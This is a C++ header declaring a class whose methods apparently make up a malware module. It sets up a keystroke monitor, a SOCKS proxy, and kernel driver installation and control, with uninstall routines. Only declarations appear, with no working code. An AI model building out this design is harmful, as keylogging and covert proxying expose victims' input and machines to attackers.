// MyWorkMoudle.h: interface for the CMyWorkMoudle class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MYWORKMOUDLE_H__3AA99B43_6891_4A26_A057_DDF4DDF8D0ED__INCLUDED_)
#define AFX_MYWORKMOUDLE_H__3AA99B43_6891_4A26_A057_DDF4DDF8D0ED__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

class CMyWorkMoudle  
{
public:
	
	void DoWork(PSDLLINFO pInfo, HINSTANCE ghInstance);
	CMyWorkMoudle();
	virtual ~CMyWorkMoudle();

private:

	PSDLLINFO	m_DllInfo;
	HMODULE		hCtrMd;
	char		m_ModFilePath[256];
	char		m_KeyFilePath[256];
	char		m_SysFilePath[256];
	char		m_SckFilePath[256];

	HANDLE		SysHandle;
	HINSTANCE	hInstance;

	void UnInstallSocks();
	void UnInstallKey();
	
	void MakeKeyMon();
	void static MakeKeyMonThread(LPVOID lPvoid);

	void MakeSocks();
	void static MakeSocksThread(LPVOID lPvoid);

	HMODULE GetModFile(char* pFilePath, UINT nCmd);

	void InitMyData(PSDLLINFO m_Info);
	void MakeModFileMd5(LPCTSTR pFileName, BYTE* sMd5Str);
	void InstallMyDriver();
	void static SSH_InDvThread(LPVOID lPvoid);
	BOOL InstallDriver(IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName, IN LPCTSTR ServiceExe);
	BOOL StartDriver(IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName);
	BOOL OpenDevice(IN LPCTSTR DriverName, HANDLE* lphDevice );
	BOOL StopDriver( IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName );
	BOOL RemoveDriver(IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName );
	BOOL UnloadDeviceDriver(const TCHAR * Name );
	BOOL InstallDeviceDriver( const TCHAR * Name, const TCHAR * Path, HANDLE * lphDevice );
	void SendDataToDrivers(DWORD nCmd, LPVOID pData, DWORD dLen);
	void UnloadMyDriver() ;
};

#endif // !defined(AFX_MYWORKMOUDLE_H__3AA99B43_6891_4A26_A057_DDF4DDF8D0ED__INCLUDED_)
